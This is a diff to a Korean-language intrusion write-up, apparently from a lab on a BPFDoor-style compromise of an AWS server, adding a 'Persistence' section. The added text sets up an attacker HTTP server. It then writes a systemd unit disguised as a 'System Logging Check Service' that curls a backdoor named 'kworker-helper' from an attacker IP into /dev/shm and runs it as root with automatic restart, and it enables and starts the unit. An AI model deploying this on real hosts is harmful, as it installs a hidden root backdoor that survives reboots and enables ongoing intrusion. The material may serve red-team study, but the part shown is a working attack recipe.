@@ -206,21 +206,52 @@ ip-10-0-26-222
 
 # 10. Persistence 설정 (Systemd)
 
+### 10.1 타겟 서버에서 재부팅시 공격서버에서 다운로드 할 수 있도록 공격서버 서버 실행
+```
+sudo python3 -m http.server 80
+```
+### 10.2 타겟 서버 
 관리자가 프로세스를 종료하거나 서버가 재부팅되어도  
 백도어가 다시 실행되도록 **systemd 서비스로 등록**한다.
-
 ```
 nano /etc/systemd/system/syslog-check.service
 ```
 
 ```ini
+[Unit]
+Description=System Logging Check Service  # 서비스의 표시 이름 설정
+After=network.target                     # 네트워크가 연결된 후 서비스 실행
+
 [Service]
-ExecStartPre=/usr/bin/curl -s http://13.x.x.x/kworker-helper -o /dev/shm/kworker-helper
+# 실행 전 공격자 서버에서 백도어 파일을 다운로드
+ExecStartPre=/usr/bin/curl -s http://13.63.34.43/kworker-helper -o /dev/shm/kworker-helper
+# 다운로드한 파일에 실행 권한 부여
 ExecStartPre=/usr/bin/chmod +x /dev/shm/kworker-helper
+# 메모리 영역(/dev/shm)에 있는 백도어 프로그램 실행
 ExecStart=/dev/shm/kworker-helper
+# 프로세스가 종료되면 무조건 자동으로 다시 시작
 Restart=always
+# 프로세스 재시작 간격을 5초로 설정
+RestartSec=5
+# 최상위 권한인 root 계정으로 프로세스 실행
+User=root
+
+[Install]
+# 일반적인 다중 사용자 환경(부팅 완료 단계)에서 자동 실행 등록
+WantedBy=multi-user.target
+
 ```
 ![img_6.png](img/BPFDoor/img_6.png)
+
+### 10.3 service 파일 생성 후 설정 활성화
+```
+sudo systemctl daemon-reload      # 1. 수정한 설정 파일을 시스템에 새로고침
+sudo systemctl enable syslog-check  # 2. 부팅 시 자동 실행되도록 등록
+sudo systemctl start syslog-check   # 3. 지금 즉시 서비스 시작 (파일 다운로드 및 실행)
+sudo systemctl status syslog-check  # 4. 서비스가 정상(active)인지 확인
+```
+서비스 정상 확인
+![img_5.png](img/AWS서버침투/img_5.png)
 ---
 
 # 11. 공격 흐름 요약
